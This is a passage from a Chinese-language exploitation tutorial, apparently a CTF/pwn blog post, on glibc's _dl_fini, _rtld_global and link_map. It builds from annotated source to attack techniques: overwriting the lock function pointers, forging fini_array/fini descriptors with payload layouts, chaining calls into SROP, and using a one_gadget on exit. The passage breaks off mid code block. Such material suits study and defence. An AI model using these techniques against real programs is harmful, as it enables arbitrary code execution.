title="ELF的fini()"></a>ELF的fini()</h3><p>被编译在elf的text段中, 由_start()传递地址给__libc_start_main()</p><p>发现其是一个空函数,因为其只有在静态编译下才会起作用,故而动态编译该函数为空</p><p>静态编译时:该函数会逐一取出fini_array数组中的函数指针执行，该函数指针数组位于bss段上</p><h3 id="ELF的init"><a href="#ELF的init" class="headerlink" title="ELF的init()"></a><strong>ELF的init()</strong></h3><p>让我们思考一个问题: 如果只有fini与init的话, ELF只能有一个构造/ 析构函数</p><p>当具有多个构造析构函数时改怎么办呢?</p><p>ELF的解决方法是, 把所有的构造函数的指针放在一个段: .init_array中, 所有的析构函数的指针放在一个段 .fini_array中</p><p><strong>init()就负责遍历.init_array, 并调用其中的构造函数, 从而完成多个构造函数的调用</strong></p><h3 id="ld的rtdl-fini"><a href="#ld的rtdl-fini" class="headerlink" title="ld的rtdl_fini()"></a>ld的rtdl_fini()</h3><p>我们说完了.init_array, 那么对于.fini_array呢?</p><p>很明显不是ELF的fini()负责 , 因为他就是一个空函数, 那么就只能<u>由rtdl_fini来负责</u></p><p><strong><em>rtdl_fini实际指向_dl_fini()函数</em></strong>, 源码在dl-fini.c文件中, 会被编译到ld.so.2中</p><p>我们把进程空间中的一个单独文件, 称之为模块</p><p>ld.so.2会通过dl_open()把所需文件到进程空间中, 他会把所有映射的文件都记录在结构体_rtld_global中</p><p>当一个进程终止, ld.so.2自然需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><p><strong>一言以蔽之: _dl_fini()的功能就是调用进程空间中所有模块的析构函数</strong></p><h3 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="rtld_global结构体"></a>rtld_global结构体</h3><p>接着来看_rtld_global结构体, 这个结构体很复杂, 我们只看与本文相关的</p><p>_rtld_global一般通过宏GL来引用, 这个结构体定义在ld.so.2的data段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><ul><li>再看其结构体struct rtld_global的定义<ul><li>一些缩写的含义:<ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li></ul></li><li>struct rtld_global先以命名空间为单位建立了一个数组 _dl_ns[DL_NNS]</li><li>在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 映射模块的搜索表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">        <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">        <span class="type">size_t</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            __rtld_lock_define_recursive(, lock) <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="type">uint32_t</span> hashval;           <span class="comment">//符号hash值</span></span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">//名称</span></span><br><span class="line">                <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> * sym;      <span class="comment">//符号</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">            &#125; * entries;                   <span class="comment">//entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号</span></span><br><span class="line">            <span class="type">size_t</span> size;                   <span class="comment">//有多少个元素</span></span><br><span class="line">            <span class="type">size_t</span> n_elements;</span><br><span class="line">            <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">        &#125; _ns_unique_sym_table;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录命名空间变化的, debug用 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">    &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */</span></span><br><span class="line">    <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的</p><ul><li>ELF文件都是通过节的组织的, ld自然也延续了这样的思路,</li><li>l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElfW(Addr) l_addr;                <span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line">   <span class="type">char</span> *l_name;                     <span class="comment">/* 模块的文件名  */</span></span><br><span class="line">   ElfW(Dyn) * l_ld;                 <span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 双向链表指针 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line">   Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">   <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">   ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">   ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">   ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  */</span></span><br><span class="line"></span><br><span class="line">    ...;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ElfW(Dyn)是一个节描述符类型, 宏展开结果为Elf64_Dyn, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword    d_tag;            <span class="comment">/* 便签, 用于标注描述符类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>        </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Xword d_val;        <span class="comment">/* 内容可以是一个值 */</span></span><br><span class="line">  Elf64_Addr d_ptr;            <span class="comment">/* 也可以是一个指针 */</span></span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>至此rtld_global的结构就清楚了, 他自顶向下按照: <strong>命名空间-&gt;模块-&gt;节</strong> 的形式<u>描述所有的模块,</u> 通过_ns_unique_sym_table描述命名空间中所有的可见符号</p><h2 id="dl-fini-源码分析"><a href="#dl-fini-源码分析" class="headerlink" title="_dl_fini()源码分析"></a>_dl_fini()源码分析</h2><p>理解了模块是如何组织的之后, _dl_fini的任务就显而易见了:</p><ul><li>遍历rtld_global中所有的命名空间</li><li>遍历命名空间中所有的模块</li><li>找到这个模块的fini_array段, 并调用其中的所有函数指针</li><li>找到这个模块的fini段, 调用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> internal_function _dl_fini(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">        __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)</span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */</span></span><br><span class="line">            <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert(nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next) <span class="comment">//遍历链表</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)                                                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    assert(i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            ...;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;    <span class="comment">//多少个模块</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对maps进行排序, 确定析构顺序 */</span></span><br><span class="line">            _dl_sort_fini(maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 从前往后, 析构maps中的每一个模块 */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* debug时打印下相关信息 */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,DSO_FILENAME(l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 如果有fini_array节的话 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                                array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/* </span></span><br><span class="line"><span class="comment">                                ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                                i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)    <span class="comment">//从后往前, 调用fini_array中的每一个析构函数</span></span><br><span class="line">                                ((<span class="type">fini_t</span>)<span class="built_in">array</span>[i])();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 调用fini段中的函数 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考2-rtdl-fini-带来的可利用点"><a href="#思考2-rtdl-fini-带来的可利用点" class="headerlink" title="思考2:rtdl_fini()带来的可利用点"></a>思考2:rtdl_fini()带来的可利用点</h2><p>rtdl_fini()十分依赖与rtld_global这一数据结构, 并且rtld_global中的数据并没有被加密, 这就带来了两个攻击面</p><ul><li>劫持rtld_global中的锁相关函数指针</li><li>修改rtld_global中的l_info, 伪造fini_array/ fini的节描述符, 从而劫持fini_array/ fini到任意位置, 执行任意函数</li></ul><h3 id="劫持rtld-global中的函数指针"><a href="#劫持rtld-global中的函数指针" class="headerlink" title="劫持rtld_global中的函数指针"></a>劫持rtld_global中的函数指针</h3><p>ld相关函数在使用rtld_global时都需要先上锁, 以避免多进程下的条件竞争问题</p><p>相关函数包括但不限于:</p><ul><li>_dl_open()</li><li>_dl_fini()</li><li>….</li></ul><p>上锁操作是通过宏进行的, 宏定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>宏展开:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line">=&gt;    GL(dl_rtld_lock_recursive) (&amp; GL(dl_load_lock).mutex)</span><br><span class="line">=&gt;    _rtld_global.dl_rtld_lock_recursive(&amp;_rtld_global.dl_load_lock.mutex)</span><br></pre></td></tr></table></figure><p>可以看到实际调用的是dl_rtld_lock_recursive函数指针</p><p>释放锁的操作也是类似的, 调用的是_dl_rtld_unlock_recursive函数指针, 这两个函数指针再rtld_global中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...;</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_lock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_unlock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ld作为mmap的文件, 与libc地址固定</p><p><strong>也就是说, 当有了任意写+libc地址后, 我们可以通过覆盖_rtld_global中的lock/ unlock函数指针来getshell</strong></p><h3 id="劫持l-info伪造fini-array节"><a href="#劫持l-info伪造fini-array节" class="headerlink" title="劫持l_info伪造fini_array节"></a>劫持l_info伪造fini_array节</h3><p>我们的目标是伪造rtld_global中关于fini_array节与fini_arraysize节的描述</p><p>将fini_array节迁移到一个可控位置, 比如堆区, 然后在这个可控位置中写入函数指针, 那么在exit()时就会依次调用其中的函数指针</p><p>l_info中关于fini_array节的描述符下标为26, 关于fini_arraysz节的下标是28,l_info中的指针正好指向的就是Dynamic段中相关段描述符</p><p>此时我们就可以回答ELF中fini_array中的析构函数是怎么被调用的这个问题了:</p><p><strong>exit()调用__exit_funcs链表中的_rtdl_fini()函数, 由_rtdl_fini()函数寻找到ELF的fini_array节并调用</strong></p><p>假设我们修改rtld_global中的l_info[0x1a]为addrA, 修改l_info[0x1c]为addrB</p><p>那么首先在addrA addrB中伪造好描述符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1b, N)</span><br></pre></td></tr></table></figure><p><strong>然后在addrC中写入函数指针就可以在exit时执行了</strong></p><h3 id="fini-array与ROP"><a href="#fini-array与ROP" class="headerlink" title="fini_array与ROP"></a>fini_array与ROP</h3><p>当我们可以劫持fini_array之后, 我们就具备了连续调用多个函数的能力, 那么有无可能像ROP一样, 让多个函数进行组合, 完成复杂的工作?</p><p>多个fini_array函数调用之间, 寄存器环境十分稳定, 只有: rdx r13会被破坏, 这是一个好消息</p><p>考察执行call时的栈环境, 我们发现rdi总是指向一个可读可写区域, 可以当做我们函数的缓冲区</p><p>那么就已经有了大致的利用思路,</p><ol><li>让fini_array先调用gets()函数, 在rdi中读入SigreturnFrame</li><li>然后再调用setcontext+53, 即可进行SROP, 劫持所有寄存器</li><li>如果高版本libc, setcontext使用rdx作为参数, 那么在gets(rdi)后还需要一个gadget, 能通过rdi设置rdx,<br>再执行setcontext</li></ol><h3 id="劫持fini"><a href="#劫持fini" class="headerlink" title="劫持fini"></a>劫持fini</h3><p>fini段在l_info中下标为13,这个描述符中直接放的就是函数指针, 利用手法较为简单, 但是只能执行一个函数, 通常设置为onegadget</p><p>例如我们可以<strong>修改rtld_global中l_info[0xd]为addrA, 然后再addrA中写入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, onegadget)</span><br></pre></td></tr></table></figure><p>就可以在exit()时触发</p><h3 id="exit-与FILE"><a href="#exit-与FILE" class="headerlink" title="exit()与FILE"></a>exit()与FILE</h3><p>一开始的run_exit_handlers么, 在遍历完exit_funcs链表后, 还有最后一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">  RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>__libc_atexit其实<strong>是libc中的一个段</strong></p><p>这个函数会调用<strong>_IO_cleanup()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 关闭所有流.  */</span></span><br><span class="line"><span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_IO_cleanup()会调用两个函数</strong></p><ul><li><strong>_IO_flush_all_lockp()会通过_IO_list_all遍历所有流, 对每个流调用_IO_OVERFLOW(fp), 保证关闭前缓冲器中没有数据残留</strong></li><li><strong>_IO_unbuffer_all()会通过_IO_list_all遍历所有流, 对每个流调用_IO_SETBUF(fp, NULL, 0), 来释放流的缓冲区</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_cleanup(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 刷新所有流 */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 关闭所有流的缓冲区 */</span></span><br><span class="line">  _IO_unbuffer_all();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 